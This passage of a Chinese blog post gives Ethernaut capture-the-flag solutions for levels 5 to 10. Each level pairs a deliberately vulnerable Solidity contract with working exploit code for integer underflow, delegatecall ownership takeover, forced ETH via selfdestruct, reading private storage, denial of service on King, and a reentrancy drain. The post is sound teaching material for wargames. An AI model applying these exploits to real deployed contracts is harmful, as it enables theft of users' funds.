class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><p>显然，目标合约存在整数溢出漏洞，以加减法为例，在 Solidity 中 <code>(2**256 - 1) + 1 = 0</code> ， <code>0 - 1 = 2**256 - 1</code> 。目标合约中如果我们传入的 value 大于 20，则 <code>balances[msg.sender] - _value</code> 会溢出变成极大数，如此可以顺利通过 require 检验，并使得发送者获得天量代币。因此我们只要向除了 player 地址外的任意地址转账超过 20 个代币即可完成攻击：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.transfer(<span class="string">'some address'</span>, <span class="number">21</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h2><h3 id="通关条件-5"><a href="#通关条件-5" class="headerlink" title="通关条件"></a>通关条件</h3><p>获得目标合约（Delegation）的 ownership</p>
+<h3 id="目标合约-5"><a href="#目标合约-5" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意 delegatecall 调用的是其他合约的代码，但是修改的是当前合约的存储空间。</p>
+<p>观察题目我们可以发现 Delegation 的 fallback 函数会使用 delegatecall 调用 Delegate 合约，而 Delegate 合约中的 pwn() 函数就是用来修改 owner 的。因此我们只需要向 Delegation 合约发送一笔 msg.data 为 pwn() 函数签名的交易即可：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: web3.eth.abi.encodeFunctionSignature(<span class="string">'pwn()'</span>)&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h2><h3 id="通关条件-6"><a href="#通关条件-6" class="headerlink" title="通关条件"></a>通关条件</h3><p>使得目标合约的 ETH 余额大于 0</p>
+<h3 id="目标合约-6"><a href="#目标合约-6" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><p>第一反应：一脸懵逼。</p>
+<p>目标合约是一个空合约，没有实现 payable 的 fallback 函数，自然无法给他转 ETH。所以我们需要一些强制手段（这就是题目是 <code>force</code> 的原因）。通过参考<a href="https://medium.com/@alexsherbuck/two-ways-to-force-ether-into-a-contract-1543c1311c56" target="_blank" rel="noopener">这篇文章</a>得知，使用 <code>selfdestruct</code> 函数毁灭合约，可以将合约中的 ETH 强制转移到指定地址。所以可得攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract HackForce &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params">address payable _addr</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用 hack 函数即可。</p>
+<p>补充：文章中还提到，由于合约地址是可以预先算出来的，如果事先转账到算出来的合约地址上，就可以在合约创建后令合约内强制存在 ETH。</p>
+<h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h2><h3 id="通关条件-7"><a href="#通关条件-7" class="headerlink" title="通关条件"></a>通关条件</h3><p>解锁目标合约</p>
+<h3 id="目标合约-7"><a href="#目标合约-7" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(bytes32 _password) public &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><p>要明确的是，区块链上一切都是透明的，private 关键字只能防止其他合约访问这个变量，不代表我们没法看到它的值。这也就是说，目标合约中的 password 是明文存在链上的。那么我们如何访问它呢？</p>
+<p>我们需要了解一些 Solidity 合约的数据存储布局的知识。以下内容摘抄整理自<a href="https://learnblockchain.cn/books/geth/part7/storage.html" target="_blank" rel="noopener">这里</a>。</p>
+<ol>
+<li><p>Solidity 合约的数据存储在容量为 2**256 的插槽（slot）数组中，每个插槽可以存储 32 字节数据</p>
+</li>
+<li><p>数据在插槽中以低位对齐方式存储</p>
+</li>
+<li><p>合约中定义的存储变量会按定义顺序存入插槽，比如目标合约中的例子，locked 会先存入插槽，然后是 password</p>
+</li>
+<li><p>存储新的变量时，如果插槽剩余空间足以存储该变量，则该变量会存储在当前插槽中。如果插槽剩余空间不足，则会存储到下一个插槽中（比如以下合约，一共占用 3 个插槽）。</p>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract StorageExample2 &#123;</span><br><span class="line">       uint256 a = <span class="number">11</span>; <span class="comment">// 插槽 0，32 字节</span></span><br><span class="line">       uint8 b = <span class="number">12</span>; <span class="comment">// 插槽 1，1 字节</span></span><br><span class="line">       uint128 c = <span class="number">13</span>; <span class="comment">// 插槽 1，16 字节</span></span><br><span class="line">       bool d = <span class="literal">true</span>; <span class="comment">// 插槽 1，1 字节</span></span><br><span class="line">       uint128 e =  <span class="number">14</span>; <span class="comment">// 插槽 2，32 字节</span></span><br><span class="line">       uint[<span class="number">2</span>] c = [<span class="number">13</span>,<span class="number">14</span>]; <span class="comment">// 插槽 3，32 字节；插槽 4，32 字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 由于这个特性，在写合约的时候我们需要注意变量的定义顺序，良好的顺序可以节约存储空间。此外，EVM 每次读取数据进行处理时，都是读取 32 字节，数据小于 32 字节的时候，还需要额外做 unpadding 等操作，因此相比取 32 字节值的数据，取小于 32 字节的数据需要消耗更多的 gas。</p>
+</li>
+<li><p>动态大小变量（Mapping/动态数组）的存储另有规则，详见<a href="https://solidity.readthedocs.io/en/v0.7.4/internals/layout_in_storage.html" target="_blank" rel="noopener">文档</a>。这里简单说下：</p>
+<ol>
+<li>对于 string 和 bytes，如果数据长度小于 31 字节，则数据会存储在高位字节，最低位字节存储 length * 2</li>
+<li>如果数据长度超出 31 字节，则定义变量的插槽存储 length * 2 + 1，数据存储在第 keccak256(slot) 个插槽中。</li>
+<li>对于动态数组，在定义变量的插槽存储 length，数据从第 keccak256(slot) 个插槽开始存储。在每个插槽中，数据以低位对齐方式排列。</li>
+<li>对于 Mapping 而言，每个 Key 对应一份存储，其存储位置位于 keccak256(abi.encodePacked(key, slot))。</li>
+<li>对于结构体这样的组合类型，则是在组合内部遵循上述规则递归处理。</li>
+</ol>
+</li>
+<li><p>我们可以从下图中了解常见数据类型的存储 ：</p>
+</li>
+</ol>
+<p><img src="/uploads/solidityStorageLayout.png" alt="image.png"></p>
+<p>回到题目中，我们只需要从合约中读取 password 即可。在目标合约中，password 会存储在插槽 1 中（插槽 0 存储了 locked，占据 <a href="https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6" target="_blank" rel="noopener">1 字节</a>（是的，不是 1 bit) ，剩下的 31 字节不足以存储 32 字节的 password），所以我们可以进行如下操作：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> password = <span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">1</span>)</span><br><span class="line">contract.unlock(password)</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h2><h3 id="通关条件-8"><a href="#通关条件-8" class="headerlink" title="通关条件"></a>通关条件</h3><p>占据目标合约的 “King”，使得其他人无法取而代之</p>
+<h3 id="目标合约-8"><a href="#目标合约-8" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_king</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address payable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><p>观察合约可以知道，当 King 合约接收到转账的时候，会校验转账金额，通过校验的话，则向当前 King 退款并设置新的 King。我们的任务就是阻止新的 King 的设置，那么使得 King 合约执行到 <code>king.transfer(msg.value)</code> 时 revert 即可。攻击合约如下，不设置 payable 的 fallback 函数或者在 fallback 函数中 revert 都可以。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract KingForever &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">beKing</span>(<span class="params">address payable addr</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        (bool success, ) = addr.call.value(msg.value)(<span class="string">""</span>);</span><br><span class="line">        <span class="built_in">require</span>(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h2><h3 id="通关条件-9"><a href="#通关条件-9" class="headerlink" title="通关条件"></a>通关条件</h3><p>取走合约中的所有资金</p>
+<h3 id="目标合约-9"><a href="#目标合约-9" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result, bytes memory data) = msg.sender.call.value(_amount)(<span class="string">""</span>);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h3><p>我们知道，合约接收到转账，可以通过实现 payable fallback 函数来触发某些操作。目标合约的 withdraw 函数会向 msg.sender 发送 ETH，在此之后才修改 msg.sender 的账户余额，所以我们可以实现一个攻击合约，该合约的 payable fallback 函数会继续调用目标合约的 withdraw 函数。只要设置合适的 _amount，就可以取光所有资金（所谓重入，就是重复进入）。攻击合约代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract HackReentrance &#123;</span><br><span class="line"></span><br><span class="line">    Reentrance r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address payable _addr) public &#123;</span><br><span class="line">        r = Reentrance(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">uint _amount</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        r.donate.value(_amount)(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        r.withdraw(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        r.withdraw(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先向攻击合约转账 0.2 ETH，再调用攻击合约的 donate 函数，将 0.2 ETH 存入目标合约，最后调用攻击合约的 hack 函数，取款 0.2 ETH，这样就会调用 6 次 withdraw，将目标合约资金取光。</p>
+<p>为了防范重入漏洞，需要记得一定先调账，最后才实际转账；也可以使用 <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#ReentrancyGuard" target="_blank" rel="noopener">ReentrancyGuard</a> 来防止重入。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Solidity/" rel="tag"># Solidity</a>
+          
+            <a href="/tags/Ethereum/" rel="tag"># Ethereum</a>
+          
+            <a href="/tags/Blockchain/" rel="tag"># Blockchain</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/01/27/alipay-share-without-SDK/" rel="next" title="无 SDK 实现支付宝分享">
+                <i class="fa fa-chevron-left"></i> 无 SDK 实现支付宝分享
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/11/15/ethernaut-workthrough-11-21/" rel="prev" title="Ethernaut 题解（11-21）">
+                Ethernaut 题解（11-21） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Lanford33</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/%7C%7C%20archive">
+                
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">分类</span>
+                  
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-写在前面"><span class="nav-number">1.</span> <span class="nav-text">-1. 写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0-Hello-Ethernaut"><span class="nav-number">2.</span> <span class="nav-text">0. Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Fallback"><span class="nav-number">3.</span> <span class="nav-text">1. Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件"><span class="nav-number">3.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约"><span class="nav-number">3.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程"><span class="nav-number">3.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Fallout"><span class="nav-number">4.</span> <span class="nav-text">2. Fallout</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-1"><span class="nav-number">4.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-1"><span class="nav-number">4.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-1"><span class="nav-number">4.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Coin-Flip"><span class="nav-number">5.</span> <span class="nav-text">3. Coin Flip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-2"><span class="nav-number">5.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-2"><span class="nav-number">5.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-2"><span class="nav-number">5.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Telephone"><span class="nav-number">6.</span> <span class="nav-text">4. Telephone</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-3"><span class="nav-number">6.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-3"><span class="nav-number">6.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-3"><span class="nav-number">6.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Token"><span class="nav-number">7.</span> <span class="nav-text">5. Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-4"><span class="nav-number">7.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-4"><span class="nav-number">7.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-4"><span class="nav-number">7.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-Delegation"><span class="nav-number">8.</span> <span class="nav-text">6. Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-5"><span class="nav-number">8.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-5"><span class="nav-number">8.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-5"><span class="nav-number">8.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-Force"><span class="nav-number">9.</span> <span class="nav-text">7. Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-6"><span class="nav-number">9.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-6"><span class="nav-number">9.2.</span> <span class="nav-text">目标合约</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题过程-6"><span class="nav-number">9.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-Vault"><span class="nav-number">10.</span> <span class="nav-text">8. Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通关条件-7"><span class="nav-number">10.1.</span> <span class="nav-text">通关条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目标合约-7"><span 